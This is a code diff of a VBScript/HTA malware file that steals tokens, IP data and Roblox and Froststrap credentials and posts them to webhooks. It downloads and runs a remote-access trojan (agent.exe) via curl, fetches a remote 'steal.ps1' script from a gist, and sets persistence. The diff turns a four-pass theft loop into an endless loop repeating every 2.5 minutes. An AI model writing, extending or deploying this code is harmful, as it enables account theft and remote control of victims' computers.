@@ -25,7 +25,7 @@ Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
-Call PostFullRobloxUI ' <--- ADDED THIS EXACT UI FROM SCREENSHOT
+Call PostFullRobloxUI
 
 ' --- Download & Execute RAT 2 Times ---
 Dim downloadAttempt
@@ -35,16 +35,19 @@ For downloadAttempt = 1 To 2
     If downloadAttempt < 2 Then Call SleepMinutes(2)
 Next
 
-' --- Re-run grab chain 4x (every 5 min) ---
+' --- INFINITE Re-grab chain (every 2.5 minutes) ---
 Dim runCount
-For runCount = 1 To 4
-    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 16711680, RE_WH)
+runCount = 0
+Do
+    runCount = runCount + 1
+    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 16711680, RE_WH)
     Call GrabTokens
     Call IP
     Call GrabRoblox
     Call GrabFroststrap
-    If runCount < 4 Then Call SleepMinutes(5)
-Next
+    ' Sleep for 2.5 minutes (150 seconds)
+    Call SleepSeconds(150)
+Loop
 
 window.close()
 
@@ -221,7 +224,6 @@ Sub DropRAT()
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Native curl.exe download
     sh.Run "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """", 0, True
 
     Dim rDone : rDone = False
@@ -284,7 +286,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.github.com/lozix94-afk/6f9a82f866d336ee4f1527fb54fd0c83", False
+    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1?v=999", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
